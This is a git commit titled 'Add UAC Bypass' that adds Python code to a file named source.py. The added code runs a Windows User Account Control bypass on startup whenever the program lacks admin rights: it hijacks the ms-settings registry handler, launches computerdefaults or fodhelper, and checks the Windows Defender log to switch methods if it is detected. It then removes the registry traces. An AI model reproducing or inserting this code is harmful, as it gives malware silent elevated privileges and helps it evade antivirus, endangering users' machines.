232e2afaa0dc6159065de4a73fd537bc58109f66
JuicyChann <nik.xeiladakis@gmail.com>
2023-07-26 02:48:12 +0300

    Add UAC Bypass

--- source.py
+++ source.py
@@ -29,6 +29,49 @@ import asyncio
 import sys
 import os
 import time
+import ctypes
+
+def UACbypass(method: int = 1) -> bool:
+    if GetSelf()[1]:
+        execute = lambda cmd: subprocess.run(cmd, shell= True, capture_output= True)
+        match method:
+            case 1:
+                execute(f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{sys.executable}\" /f")
+                execute("reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f")
+                log_count_before = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
+                execute("computerdefaults --nouacbypass")
+                log_count_after = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
+                execute("reg delete hkcu\Software\\Classes\\ms-settings /f")
+                if log_count_after > log_count_before:
+                    return UACbypass(method + 1)
+            case 2:
+                execute(f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{sys.executable}\" /f")
+                execute("reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f")
+                log_count_before = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
+                execute("fodhelper --nouacbypass")
+                log_count_after = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
+                execute("reg delete hkcu\Software\\Classes\\ms-settings /f")
+                if log_count_after > log_count_before:
+                    return UACbypass(method + 1)
+            case _:
+                return False
+        return True
+
+def IsAdmin() -> bool:
+    return ctypes.windll.shell32.IsUserAnAdmin() == 1
+
+def GetSelf() -> tuple[str, bool]:
+    if hasattr(sys, "frozen"):
+        return (sys.executable, True)
+    else:
+        return (__file__, False)
+
+
+if not IsAdmin():
+    if GetSelf()[1]:
+        if UACbypass():
+                os._exit(0)
+
 auto = 'auto'
 
 #
